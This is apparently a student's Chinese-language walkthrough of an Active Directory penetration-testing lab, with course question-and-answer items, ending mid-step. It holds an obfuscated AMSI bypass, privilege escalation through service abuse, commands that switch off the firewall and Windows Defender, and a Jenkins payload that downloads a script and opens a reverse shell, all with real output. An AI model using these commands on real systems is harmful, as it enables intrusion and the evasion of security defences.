# 客户端远程连接
下载工具：
https://mremoteng.org/download


# 绕过AMSI
```
S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ([TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE (('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

# 绕过powershell执行策略
```
powershell -ep bypass
```

# Learning Objective - 1

## 我是谁
```

PS C:\AD> whoami /all

USER INFORMATION
----------------

User Name        SID
================ ==============================================
dcorp\student366 S-1-5-21-1874506631-3219952063-538504511-45144


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON      Well-known group S-1-5-14                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0                                       Mandatory group, Enabled by default, Enabled group
dcorp\RDPUsers                             Group            S-1-5-21-1874506631-3219952063-538504511-1116 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

## 当前域
```
PS C:\AD> get-netdomain


Forest                  : moneycorp.local
DomainControllers       : {dcorp-dc.dollarcorp.moneyco
Children                : {us.dollarcorp.moneycorp.loc
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : moneycorp.local
PdcRoleOwner            : dcorp-dc.dollarcorp.moneycor
RidRoleOwner            : dcorp-dc.dollarcorp.moneycor
InfrastructureRoleOwner : dcorp-dc.dollarcorp.moneycor
Name                    : dollarcorp.moneycorp.local
```

## 当前域组信息
```
PS C:\AD> Get-NetGroup
Administrators
Users
Guests
Print Operators
Backup Operators
Replicator
Remote Desktop Users
Network Configuration Operators
Performance Monitor Users
Performance Log Users
Distributed COM Users
IIS_IUSRS
Cryptographic Operators
Event Log Readers
Certificate Service DCOM Access
RDS Remote Access Servers
RDS Endpoint Servers
RDS Management Servers
Hyper-V Administrators
Access Control Assistance Operators
Remote Management Users
System Managed Accounts Group
Storage Replica Administrators
Domain Computers
Domain Controllers
Cert Publishers
Domain Admins
Domain Users
Domain Guests
Group Policy Creator Owners
RAS and IAS Servers
Server Operators
Account Operators
Pre-Windows 2000 Compatible Access
Windows Authorization Access Group
Terminal Server License Servers
Allowed RODC Password Replication Group
Denied RODC Password Replication Group
Read-only Domain Controllers
Cloneable Domain Controllers
Protected Users
Key Admins
DnsAdmins
DnsUpdateProxy
RDPUsers
```


## 域中所有用户
```
PS C:\AD> get-netuser |selec

cn
--
Administrator
Guest
DefaultAccount
krbtgt
ci admin
sql admin
web svc
srv admin
app admin
mgmt admin
svc admin
studentadmin
sql1 admin
test da
Control359User
Control360User
Control361User
Control362User
Control363User
Control364User
Control365User
Control366User
Control367User
Control368User
Control369User
Control370User
Support359User
Support360User
Support361User
Support362User
Support363User
Support364User
Support365User
Support366User
Support367User
Support368User
Support369User
Support370User
VPN359User
VPN360User
VPN361User
VPN362User
VPN363User
VPN364User
VPN365User
VPN366User
VPN367User
VPN368User
VPN369User
VPN370User
student359
student360
student361
student362
student363
student364
student365
student366
student367
student368
student369
student370
Spiderman
```

## 当前域中计算机列表
```
PS C:\AD> Get-NetComputer
dcorp-dc.dollarcorp.moneycorp.local
dcorp-mgmt.dollarcorp.moneycorp.local
dcorp-ci.dollarcorp.moneycorp.local
dcorp-mssql.dollarcorp.moneycorp.local
dcorp-adminsrv.dollarcorp.moneycorp.local
dcorp-appsrv.dollarcorp.moneycorp.local
dcorp-sql1.dollarcorp.moneycorp.local
dcorp-stdadm.dollarcorp.moneycorp.local
dcorp-std359.dollarcorp.moneycorp.local
dcorp-std360.dollarcorp.moneycorp.local
dcorp-std361.dollarcorp.moneycorp.local
dcorp-std362.dollarcorp.moneycorp.local
dcorp-std363.dollarcorp.moneycorp.local
dcorp-std364.dollarcorp.moneycorp.local
dcorp-std365.dollarcorp.moneycorp.local
dcorp-std366.dollarcorp.moneycorp.local
dcorp-std367.dollarcorp.moneycorp.local
dcorp-std368.dollarcorp.moneycorp.local
dcorp-std369.dollarcorp.moneycorp.local
dcorp-std370.dollarcorp.moneycorp.local
```

## 获取域管理员组所有成员
```
PS C:\AD> Get-NetGroupMember -GroupName "Domain Admins" -Recurse


GroupDomain  : dollarcorp.moneycorp.local
GroupName    : Domain Admins
MemberDomain : dollarcorp.moneycorp.local
MemberName   : Spiderman
MemberSID    : S-1-5-21-1874506631-3219952063-538504511-68101
IsGroup      : False
MemberDN     : CN=Spiderman,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local

GroupDomain  : dollarcorp.moneycorp.local
GroupName    : Domain Admins
MemberDomain : dollarcorp.moneycorp.local
MemberName   : svcadmin
MemberSID    : S-1-5-21-1874506631-3219952063-538504511-1122
IsGroup      : False
MemberDN     : CN=svc admin,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local

GroupDomain  : dollarcorp.moneycorp.local
GroupName    : Domain Admins
MemberDomain : dollarcorp.moneycorp.local
MemberName   : Administrator
MemberSID    : S-1-5-21-1874506631-3219952063-538504511-500
IsGroup      : False
MemberDN     : CN=Administrator,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local

```

域管理员：Spiderman，svcadmin，Administrator


因为这不是根域，所以下面命令无显示
```Get-NetGroupMember -GroupName "Enterprise Admins"```

需要加上根域的名称：moneycorp.local
```
PS C:\AD> Get-NetGroupMember -GroupName "Enterprise Admins" -Domain moneycorp.local


GroupDomain  : moneycorp.local
GroupName    : Enterprise Admins
MemberDomain : moneycorp.local
MemberName   : Administrator
MemberSID    : S-1-5-21-280534878-1496970234-700767426-500
IsGroup      : False
MemberDN     : CN=Administrator,CN=Users,DC=moneycorp,DC=local
```

问题：SID of the member of the Enterprise Admins group
答案：S-1-5-21-280534878-1496970234-700767426-500

# Learning Objective - 2

## 获取所有OU
```
 Get-NetOU -FullData
```

## 获取所有GPO
```
Get-NetGPO -FullData
```


## 获取OUName是StudentMachines的全部信息
```
PS C:\AD> Get-NetOU -OUName StudentMachines -FullData

usncreated            : 65752
name                  : StudentMachines
gplink                : [LDAP://cn={3E04167E-C2B6-4A9A-8FB7-C811158DC97C},cn=policies,cn=system,DC=dollarcorp,DC=moneycorp,DC=local;0]
whenchanged           : 2/19/2019 7:04:25 AM
objectclass           : {top, organizationalUnit}
usnchanged            : 65837
dscorepropagationdata : {5/3/2020 9:04:05 AM, 5/3/2020 9:04:05 AM, 5/3/2020 9:04:05 AM, 2/21/2019 3:13:33 PM...}
adspath               : LDAP://OU=StudentMachines,DC=dollarcorp,DC=moneycorp,DC=local
distinguishedname     : OU=StudentMachines,DC=dollarcorp,DC=moneycorp,DC=local
ou                    : StudentMachines
whencreated           : 2/19/2019 7:01:04 AM
instancetype          : 4
objectguid            : 284a1630-3d96-45c6-99a0-1f8d138f29d5
objectcategory        : CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=moneycorp,DC=local

```

可以看到gplink里的GOPName是：{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}


## 获取指派给这个GPOname的OU
```
PS C:\AD> Get-NetGPO -GPOname "{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}"


usncreated               : 65831
displayname              : Students
gpcmachineextensionnames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F72-3407-48AE-BA88-E8213C6761F1}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
whenchanged              : 4/20/2019 6:22:16 AM
objectclass              : {top, container, groupPolicyContainer}
gpcfunctionalityversion  : 2
showinadvancedviewonly   : True
usnchanged               : 123144
dscorepropagationdata    : {5/3/2020 9:04:05 AM, 2/21/2019 12:17:00 PM, 2/19/2019 1:04:02 PM, 2/19/2019 12:55:49 PM...}
name                     : {3E04167E-C2B6-4A9A-8FB7-C811158DC97C}
adspath                  : LDAP://CN={3E04167E-C2B6-4A9A-8FB7-C811158DC97C},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
flags                    : 0
cn                       : {3E04167E-C2B6-4A9A-8FB7-C811158DC97C}
gpcfilesyspath           : \\dollarcorp.moneycorp.local\SysVol\dollarcorp.moneycorp.local\Policies\{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}
distinguishedname        : CN={3E04167E-C2B6-4A9A-8FB7-C811158DC97C},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
whencreated              : 2/19/2019 7:04:25 AM
versionnumber            : 8
instancetype             : 4
objectguid               : 8ecdfe44-b617-4b9e-a9f9-4d548e5dc7b1
objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=moneycorp,DC=local

```

问题：Display name of the GPO applied on StudentMachines OU
答案：Students

# Learning Objective - 3

## Task

> ● Enumerate following for the dollarcorp domain:
> − ACL for the Users group
> − ACL for the Domain Admins group
> − All modify rights/permissions for the studentx


查找Users组的所有ACL

```
PS C:\AD> Get-ObjectAcl -SamAccountName "users" -ResolveGUIDs -Verbose
VERBOSE: Get-DomainSearcher search string: LDAP://DC=dollarcorp,DC=moneycorp,DC=local
VERBOSE: Get-DomainSearcher search string: LDAP://CN=Schema,CN=Configuration,DC=moneycorp,DC=local
VERBOSE: Get-DomainSearcher search string: LDAP://CN=Extended-Rights,CN=Configuration,DC=moneycorp,DC=local


InheritedObjectType   : All
ObjectDN              : CN=Users,CN=Builtin,DC=dollarcorp,DC=moneycorp,DC=local
ObjectType            : All
IdentityReference     : NT AUTHORITY\SELF
IsInherited           : False
ActiveDirectoryRights : GenericRead
PropagationFlags      : None
ObjectFlags           : None
InheritanceFlags      : None
InheritanceType       : None
AccessControlType     : Allow
ObjectSID             : S-1-5-32-545

InheritedObjectType   : All
ObjectDN              : CN=Users,CN=Builtin,DC=dollarcorp,DC=moneycorp,DC=local
ObjectType            : All
IdentityReference     : NT AUTHORITY\Authenticated Users
IsInherited           : False
ActiveDirectoryRights : GenericRead
PropagationFlags      : None
ObjectFlags           : None
InheritanceFlags      : None
InheritanceType       : None
AccessControlType     : Allow
ObjectSID             : S-1-5-32-545

...
...
```

同样的命令，查找Domain Admins组的所有ACL
```
PS C:\AD> Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs -Verbose
VERBOSE: Get-DomainSearcher search string: LDAP://DC=dollarcorp,DC=moneycorp,DC=local
VERBOSE: Get-DomainSearcher search string: LDAP://CN=Schema,CN=Configuration,DC=moneycorp,DC=local
VERBOSE: Get-DomainSearcher search string: LDAP://CN=Extended-Rights,CN=Configuration,DC=moneycorp,DC=local


InheritedObjectType   : All
ObjectDN              : CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
ObjectType            : All
IdentityReference     : NT AUTHORITY\Authenticated Users
IsInherited           : False
ActiveDirectoryRights : GenericRead
PropagationFlags      : None
ObjectFlags           : None
InheritanceFlags      : None
InheritanceType       : None
AccessControlType     : Allow
ObjectSID             : S-1-5-21-1874506631-3219952063-538504511-512

InheritedObjectType   : All
ObjectDN              : CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
ObjectType            : All
IdentityReference     : NT AUTHORITY\SYSTEM
IsInherited           : False
ActiveDirectoryRights : GenericAll
PropagationFlags      : None
ObjectFlags           : None
InheritanceFlags      : None
InheritanceType       : None
AccessControlType     : Allow
ObjectSID             : S-1-5-21-1874506631-3219952063-538504511-512

...
...
```

查找本账户（sudent366）的所有modify rights/permissions
```
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "sudent366"}
```

没有任何返回

同样的命令，查询RDPUsers组的权限
```
PS C:\AD> Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "RDPUsers"}


InheritedObjectType   : All
ObjectDN              : CN=Control359User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
ObjectType            : All
IdentityReference     : dcorp\RDPUsers
IsInherited           : False
ActiveDirectoryRights : GenericAll
PropagationFlags      : None
ObjectFlags           : None
InheritanceFlags      : None
InheritanceType       : None
AccessControlType     : Allow
ObjectSID             : S-1-5-21-1874506631-3219952063-538504511-45101
IdentitySID           : S-1-5-21-1874506631-3219952063-538504511-1116

InheritedObjectType   : All
ObjectDN              : CN=Control360User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
ObjectType            : All
IdentityReference     : dcorp\RDPUsers
IsInherited           : False
ActiveDirectoryRights : GenericAll
PropagationFlags      : None
ObjectFlags           : None
InheritanceFlags      : None
InheritanceType       : None
AccessControlType     : Allow
ObjectSID             : S-1-5-21-1874506631-3219952063-538504511-45102
IdentitySID           : S-1-5-21-1874506631-3219952063-538504511-1116
```


问题：ActiveDirectory Rights for RDPUsers group on the users named ControlxUser
答案：GenericAll

# Learning Objective - 4

## Task
> • Enumerate all domains in the moneycorp.local forest.
> • Map the trusts of the dollarcorp.moneycorp.local domain.
> • Map External trusts in moneycorp.local forest.
> • Identify external trusts of dollarcorp domain. Can you enumerate trusts for a trusting forest?


枚举moneycorp.local林中的所有域
```
PS C:\AD> Get-NetForestDomain -Forest moneycorp.local


Forest                  : moneycorp.local
DomainControllers       : {dcorp-dc.dollarcorp.moneycorp.local}
Children                : {us.dollarcorp.moneycorp.local}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : moneycorp.local
PdcRoleOwner            : dcorp-dc.dollarcorp.moneycorp.local
RidRoleOwner            : dcorp-dc.dollarcorp.moneycorp.local
InfrastructureRoleOwner : dcorp-dc.dollarcorp.moneycorp.local
Name                    : dollarcorp.moneycorp.local

Forest                  : moneycorp.local
DomainControllers       : {mcorp-dc.moneycorp.local}
Children                : {dollarcorp.moneycorp.local}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  :
PdcRoleOwner            : mcorp-dc.moneycorp.local
RidRoleOwner            : mcorp-dc.moneycorp.local
InfrastructureRoleOwner : mcorp-dc.moneycorp.local
Name                    : moneycorp.local

Forest                  :
DomainControllers       :
Children                :
DomainMode              :
DomainModeLevel         :
Parent                  :
PdcRoleOwner            :
RidRoleOwner            :
InfrastructureRoleOwner :
Name                    : us.dollarcorp.moneycorp.local

```

枚举moneycorp.local林中的所有信任关系
```
PS C:\AD> Get-NetForestDomain -Verbose | Get-NetDomainTrust

SourceName                 TargetName                      TrustType TrustDirection
----------                 ----------                      --------- --------------
dollarcorp.moneycorp.local moneycorp.local               ParentChild  Bidirectional
dollarcorp.moneycorp.local us.dollarcorp.moneycorp.local ParentChild  Bidirectional
dollarcorp.moneycorp.local eurocorp.local                   External  Bidirectional
moneycorp.local            dollarcorp.moneycorp.local    ParentChild  Bidirectional
```


枚举dollarcorp.moneycorp.local域中的所有信任关系
```
PS C:\AD> Get-NetDomainTrust -Domain dollarcorp.moneycorp.local

SourceName                 TargetName                      TrustType TrustDirection
----------                 ----------                      --------- --------------
dollarcorp.moneycorp.local moneycorp.local               ParentChild  Bidirectional
dollarcorp.moneycorp.local us.dollarcorp.moneycorp.local ParentChild  Bidirectional
dollarcorp.moneycorp.local eurocorp.local                   External  Bidirectional
```



枚举moneycorp.local林中所有的External trusts（外部信任）

```
PS C:\AD> Get-NetForestDomain -Verbose | Get-NetDomainTrust | ?{$_.TrustType -eq "External"}

SourceName                 TargetName     TrustType TrustDirection
----------                 ----------     --------- --------------
dollarcorp.moneycorp.local eurocorp.local  External  Bidirectional
```

枚举eurocorp.local林中的所有信任关系
```
PS C:\AD> Get-NetForestDomain -Forest eurocorp.local -Verbose | Get-NetDomainTrust

SourceName     TargetName                   TrustType TrustDirection
----------     ----------                   --------- --------------
eurocorp.local eu.eurocorp.local          ParentChild  Bidirectional
eurocorp.local dollarcorp.moneycorp.local    External  Bidirectional

```

问题：Trust Direction for the trust between dollarcorp.moneycorp.local and eurocorp.local
答案：Bidirectional（双向信任）


# Learning Objective - 5（1）

## Task

> ● Exploit a service on dcorp-studentx and elevate privileges to local administrator.
> ● Identify a machine in the domain where studentx has local administrative access.
> ● Using privileges of a user on Jenkins on 172.16.3.11:8080, get admin privileges on 172.16.3.11 - the dcorp-ci server.

### 提权到local administrator
使用beRoot.exe可以清楚看到AbyssWebServer有重启的权限，并且AbyssWebServer路径没有引号，可以利用提权
```
PS C:\AD> .\beRoot.exe
|====================================================================|
|                                                                    |
|                    Windows Privilege Escalation                    |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|



################ Service ################

[!] Permission to create a service with openscmanager
True

[!] Check services that could its configuration could be modified
Permissions: change config: True / start: True / stop: True
Name: AbyssWebServer
Display Name: Abyss Web Server

Permissions: change config: True / start: True / stop: True
Name: SNMPTRAP
Display Name: SNMP Trap


[!] Path containing spaces without quotes
permissions: {'change_config': True, 'start': True, 'stop': True}
Key: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\AbyssWebServer
Full path: C:\WebServer\Abyss Web Server\WebServer\abyssws.exe --service
Name: AbyssWebServer
Writables path found:
        - C:\WebServer
```


使用privesc.ps1枚举，发现了两组疑似管理员的凭据，同样枚举到AbyssWebServer可以进行“未加引号的服务路径”提权。不过传文件过去的时候exe文件会被杀软杀掉
```
PS C:\AD> . .\privesc.ps1
PS C:\AD> Invoke-Privesc
Date of last applied patch - just use public exploits if not patched:
8/17/2020

----------------------------------------------------------------------

Files that may contain Administrator password - you know what to do with this one:
C:\Windows\panther\setupinfo
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

----------------------------------------------------------------------

Services with space in path and not enclosed with quotes - if you have permissions run executable from different directory - exploit/windows/local/trusted_service_path:
C:\WebServer\Abyss Web Server\WebServer\abyssws.exe --service

----------------------------------------------------------------------

PATH variable entries permissions - place binary or DLL to execute before legitimate
Group: student366, Permissions: FullControl on C:\Python27\
Group: Users, Permissions: AppendData on C:\Program Files\Java\jdk-11.0.2\bin
Group: Users, Permissions: CreateFiles on C:\Program Files\Java\jdk-11.0.2\bin

----------------------------------------------------------------------

System32 directory permissions - backdoor windows binaries:
Permissions set on System32 directory are correct for all groups.

----------------------------------------------------------------------

System32 files and directories permissions - backdoor windows binaries:
Group: Users, Permissions: CreateFiles, ReadAndExecute, Synchronize on C:\Windows\system32\spool\drivers\color

----------------------------------------------------------------------
```


## PowerUp.ps1

枚举所有“未加引号的服务路径”
```
PS C:\AD> . .\PowerUp.ps1
PS C:\AD> Get-ServiceUnquoted


ServiceName    : AbyssWebServer
Path           : C:\WebServer\Abyss Web Server\WebServer\abyssws.exe --service
ModifiablePath : @{ModifiablePath=C:\WebServer; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AbyssWebServer' -Path <HijackPath>
CanRestart     : True

ServiceName    : AbyssWebServer
Path           : C:\WebServer\Abyss Web Server\WebServer\abyssws.exe --service
ModifiablePath : @{ModifiablePath=C:\WebServer; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AbyssWebServer' -Path <HijackPath>
```

```
PS C:\WebServer> whoami
dcorp\student366
PS C:\WebServer> Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\student366'

ServiceAbused  Command
-------------  -------
AbyssWebServer net localgroup Administrators dcorp\student366 /add

```

枚举所有可以修改服务二进制文件的服务文件（ services where the current can make changes to service binary）
```

PS C:\AD> Get-ModifiableServiceFile -Verbose
VERBOSE: Add-ServiceDacl IndividualService : AbyssWebServer


ServiceName                     : AbyssWebServer
Path                            : C:\WebServer\Abyss Web Server\WebServer\abyssws.exe --service
ModifiableFile                  : C:\WebServer\Abyss Web Server\WebServer
ModifiableFilePermissions       : AppendData/AddSubdirectory
ModifiableFileIdentityReference : BUILTIN\Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'AbyssWebServer'
CanRestart                      : True

VERBOSE: Add-ServiceDacl IndividualService : AbyssWebServer
ServiceName                     : AbyssWebServer
Path                            : C:\WebServer\Abyss Web Server\WebServer\abyssws.exe --service
ModifiableFile                  : C:\WebServer\Abyss Web Server\WebServer
ModifiableFilePermissions       : WriteData/AddFile
ModifiableFileIdentityReference : BUILTIN\Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'AbyssWebServer'
CanRestart                      : True

```

enumerate services with weak service permissions.
```
 PS C:\AD> Get-ModifiableService -Verbose
VERBOSE: Add-ServiceDacl IndividualService : AbyssWebServer
VERBOSE: Current user has 'ChangeConfig' for AbyssWebServer
VERBOSE: Add-ServiceDacl IndividualService : AbyssWebServer


ServiceName   : AbyssWebServer
Path          : C:\WebServer\Abyss Web Server\WebServer\abyssws.exe --service
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'AbyssWebServer'
CanRestart    : True

```

问题：Service abused on the student VM for local privilege escalation
答案：AbyssWebServer


根据Get-ModifiableService枚举的结果，使用Invoke-ServiceAbuse，把当前账号添加到本地管理员组
```
PS C:\AD>
PS C:\AD> Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\student366'

ServiceAbused  Command
-------------  -------
AbyssWebServer net localgroup Administrators dcorp\student366 /add
```

# Learning Objective - 5（2）

查找本地管理员可以用powershell远程登录的电脑
```
PS C:\AD> . .\Find-PSRemotingLocalAdminAccess.ps1
PS C:\AD> Find-PSRemotingLocalAdminAccess
dcorp-adminsrv
dcorp-std366
```
可以看到可以远程登录两台电脑，一台是本机，一台是dcorp-adminsrv

问题：Script used for hunting for admin privileges using PowerShell Remoting
答案：Find-PSRemotingLocalAdminAccess.ps1



现在我们可以用Enter-PSSession横向移动到另一台电脑dcorp-adminsrv（计算机全称=dcorp-adminsrv.dollarcorp.moneycorp.local，见上面当前域的计算机列表的枚举）

```
PS C:\AD> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet 3:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::34d5:8394:57f3:7610%3
   IPv4 Address. . . . . . . . . . . : 172.16.100.66
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.100.254

Tunnel adapter isatap.{6B6E4BEE-3BB9-4E5E-8522-6AC909EEF3D6}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :

PS C:\AD> Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local

[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Users\student366\Documents> whoami
dcorp\student366

[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Users\student366\Documents> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::4de0:a61b:db3f:172c%2
   IPv4 Address. . . . . . . . . . . : 172.16.4.101
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.4.254

Tunnel adapter isatap.{5A335808-BE49-450F-AFA2-F08ED9EF5EEF}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :
```

# Learning Objective - 5（3）

在未登陆的情况下，可以通过下面页面查看有什么账号
```http://172.16.3.11:8080/asynchpeople/```

可以看到有builduser，jenkinsadmin，	manager三个账号

手动测试发现

Jenkins 登录账号信息是：
```builduser:builduser```



问题：Jenkins user used to access Jenkins web console
答案：builduser

# Learning Objective - 5（4）


Jenkins特权提升，可以通过两种方法
1. 第一种是访问```http://172.16.3.11:8080/script```页面，如果当前账号拥有权限，将会被允许使用一个在线的console
2. 第二种是通过执行任务（例子页面：```http://172.16.3.11:8080/job/project0/```）,编译一段powershell反弹回来一个shell提权

powercat监听
```
PS C:\AD> . .\powercat.ps1
PS C:\AD> powercat -l -v -p 443 -t 100
VERBOSE: Set Stream 1: TCP
VERBOSE: Set Stream 2: Console
VERBOSE: Setting up Stream 1...
VERBOSE: Listening on [0.0.0.0] (port 443)
```
因为本机装了python2，用python搭一个简单的http server

```
python -m SimpleHTTPServer 80
```

在Jenkins里我用下面payload一直反弹不了shell

```powershell.exe iex (iwr http://172.16.100.66/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.66 -Port 443```

提示无法从我本机下载脚本，不知道是不是网络问题

但是可以执行其他命令得知Jenkins是由哪个用户运行的，使用```whoami /all```

问题：Domain user used for running Jenkins service on dcorp-ci
答案：ciadmin


### 关闭防火墙和windows defend

后来问了助教，原来是本地防火墙没有关闭，导致反弹不了shell
1. 关闭防火墙：
```NetSh Advfirewall set allprofiles state off```

上面命令需要管理员权限，因为我们已经在本地提权到了管理员组，只需要以run as administrator开启一个cmd命令行，然后输入当前域账号登录信息，即可以管理员身份开启cmd，执行上面命令

查看防火墙状态：
```
PS C:\Windows\system32> netsh advfirewall show currentprofile

Domain Profile Settings:
----------------------------------------------------------------------
State                                 OFF
Firewall Policy                       BlockInbound,AllowOutbound
LocalFirewallRules                    N/A (GPO-store only)
LocalConSecRules                      N/A (GPO-store only)
InboundUserNotification               Disable
RemoteManagement                      Disable
UnicastResponseToMulticast            Enable

Logging:
LogAllowedConnections                 Disable
LogDroppedConnections                 Disable
FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
MaxFileSize                           4096

Ok.
```

2. 关闭windows defend

获取windefand状态
```
PS C:\ad> Get-Service WinDefend

Status   Name               DisplayName
------   ----               -----------
Running  WinDefend          Windows Defender Service
```

以管理员身份运行下面powershll命令：
```reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpywar" /d 1 /t REG_DWORD```

再在教学面板reboot student VM (lab下不可以在VM里直接重启)

重新登录以后，再次查看windefand状态
```
PS C:\Windows\system32> Get-Service WinDefend

Status   Name               DisplayName
------   ----               -----------
Stopped  WinDefend          Windows Defender ServicePS C:\Windows\system32> Get-Service WinDefend

Status   Name               DisplayName
------   ----               -----------
Stopped  WinDefend          Windows Defender Service
```

已成功关闭windows defend


然后我把nc.exe传到靶机，用nc成功接收到反弹shell。我怀疑是powercat本身的问题。不过传nc之前一定要关闭WinDefend，不然有可能会被当成病毒被WinDefend杀掉。
```
PS C:\ad> .\nc.exe -lnvp 443
listening on [any] 443 ...
connect to [172.16.100.66] from (UNKNOWN) [172.16.3.11] 50406
Windows PowerShell running as user ciadmin on DCORP-CI
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Program Files (x86)\Jenkins\workspace\project1>whoami
dcorp\ciadmin
PS C:\Program Files (x86)\Jenkins\workspace\project1> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::e599:a231:d264:7200%2
   IPv4 Address. . . . . . . . . . . : 172.16.3.11
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.3.254

Tunnel adapter isatap.{5BF9E7FE-BDCB-487C-B818-7332CA8AFB16}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :
```


## 再再再补充
跟助教继续沟通。不是powercat的问题，其实是已经收到了反弹的shell，只不过需要按多几下Enter键才能显示出反弹shell的内容，我尼玛。。。


# Learning Objective - 6

Task
> • Setup BloodHound and identify a machine where studentx has local administrative access.



1. 收集信息
工具：BloodHound-master

引入： 
```
. .\SharpHound.ps1
```

收集全部域信息
```
Invoke-BloodHound -CollectionMethod All -verbose
```


```
PS C:\ad\BloodHound-master\Ingestors> ls


    Directory: C:\ad\BloodHound-master\Ingestors


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/12/2022   7:44 PM                DebugBuilds
-a----        2/12/2022   7:49 PM          14519 20220212194952_BloodHound.zip
-a----        2/12/2022   7:49 PM          29184 MjdjZDRjMmMtZWVhZC00YmE4LThkYmItZWQ4NWVmMjllN2Mx.bin
------        7/22/2020  11:12 AM         833536 SharpHound.exe
------        7/22/2020  11:12 AM         973425 SharpHound.ps1


```


2. 开启neo4j
工具：neo4j-community-4.1.1

去到```C:\AD\neo4j-community-4.1.1\bin```（需要管理员权限，上面通过service abuse已经把当前账号加入到本地管理员组，因此输入当前账号应该可以成功启动，需要注意账号必须是域账号，比如：dcorp\student366）执行
```
